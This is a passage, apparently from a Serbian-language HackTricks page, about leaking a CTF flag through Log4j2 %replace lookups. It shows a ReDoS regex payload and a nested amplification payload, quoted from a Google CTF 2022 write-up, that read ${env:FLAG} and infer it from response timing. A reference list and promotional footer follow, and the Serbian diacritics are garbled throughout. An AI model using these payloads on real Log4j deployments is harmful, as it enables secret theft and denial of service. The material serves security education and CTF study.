Kao 코to je pomenuto u prethodnom odeljku, **`%replace`** podr쬬va **regexe**. Dakle, mogu캖e je koristiti payload sa [**ReDoS stranice**](../regular-expression-denial-of-service-redos.md) kako bi se izazvao **timeout** u slu캜aju pronalaska zastave. Na primer, payload poput `%replace{${env:FLAG}}{^(?=CTF)((.`_`)`_`)*salt$}{asd}` bi izazvao **timeout** u tom CTF-u.

U ovom [**writeup-u**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/), umesto kori코캖enja ReDoS napada, kori코캖en je **amplifikacioni napad** kako bi se izazvala razlika u vremenu odgovora:

> ```
> /%replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{${ENV:FLAG}}{CTF\{" + flagGuess + ".*\}}{#############################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> ```
>
> Ako zastava po캜inje sa `flagGuess`, cela zastava 캖e biti zamenjena sa 29 `#`-ova (koristio sam ovaj karakter jer verovatno ne캖e biti deo zastave). **Svaki od rezultiraju캖ih 29 `#`-ova zatim je zamenjen sa 54 `#`-a**. Ovaj proces se ponavlja **6 puta**, 코to dovodi do ukupno ` 29*54*54^6* =`` `` `**`96816014208`** **`#`-ova!**
>
> Zamena toliko `#`-ova 캖e izazvati 10-sekundni timeout Flask aplikacije, 코to 캖e rezultirati slanjem HTTP status koda 500 korisniku. (Ako zastava ne po캜inje sa `flagGuess`, dobi캖emo status kod koji nije 500)

## Reference

* [https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/](https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/)
* [https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/](https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/)
* [https://www.youtube.com/watch?v=XG14EstTgQ4](https://www.youtube.com/watch?v=XG14EstTgQ4)
* [https://tryhackme.com/room/solar](https://tryhackme.com/room/solar)
* [https://www.youtube.com/watch?v=Y8a5nB-vy78](https://www.youtube.com/watch?v=Y8a5nB-vy78)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
* [https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)
* [https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/)

**Try Hard Security Group**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
